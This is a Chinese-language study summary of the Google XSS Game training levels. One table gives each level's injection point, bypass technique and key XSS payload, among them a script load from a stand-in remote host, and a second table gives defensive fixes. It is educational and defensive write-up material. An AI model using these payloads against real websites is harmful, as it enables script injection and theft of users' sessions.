# Google XSS Game 总结与防御

> 本文为 [Google XSS Game 学习索引](README.md) 的章节拆分。仅限官方教学靶场或明确授权的环境。

---

## 关卡总结

| 关卡 | 漏洞类型 | 注入点 | 核心绕过技巧 | 关键 Payload |
| --- | --- | --- | --- | --- |
| Level 1 | 反射型 XSS | `query` 参数 | 无过滤，直接注入 | `<script>alert(1)</script>` |
| Level 2 | 存储型 / DOM 型 | 留言框 | 用 `<img onerror>` 替代 `<script>` | `<img src=x onerror=alert(1)>` |
| Level 3 | DOM 型 | `location.hash` | 闭合属性，添加 `onerror` | `#1' onerror='alert(1)` |
| Level 4 | DOM 型 | `timer` 参数 | 逃逸 JavaScript 字符串上下文 | `1');alert(1);//` |
| Level 5 | DOM 型 | `next` 参数 | 注入 `javascript:` 协议 | `javascript:alert(1)` |
| Level 6 | DOM 型 | `location.hash` | 动态脚本加载 + URL 校验缺陷 | `#https://your-server.com/alert.js` |

## 防御思路速查

| 关卡 | 根本问题 | 防御要点 |
| --- | --- | --- |
| L1 | 输出到 HTML 上下文时未编码 | 对用户输入做 HTML 实体编码 |
| L2 | `innerHTML` + 黑名单过滤 | 使用 `textContent`；避免黑名单，改用白名单或编码 |
| L3 | 用户输入拼接到 HTML 属性中 | 对属性值做引号转义；避免 `.html()` 拼接 |
| L4 | 用户输入拼接到 JS 字符串中 | 使用 `JSON.stringify()` 安全嵌入；避免字符串拼接 |
| L5 | 用户输入作为 `href` 未校验协议 | 校验协议白名单（仅允许 `http`/`https`/相对路径） |
| L6 | 动态脚本加载 + 正则缺陷 | 对动态脚本的 `src` 做严格协议校验；避免加载用户可控 URL |

***


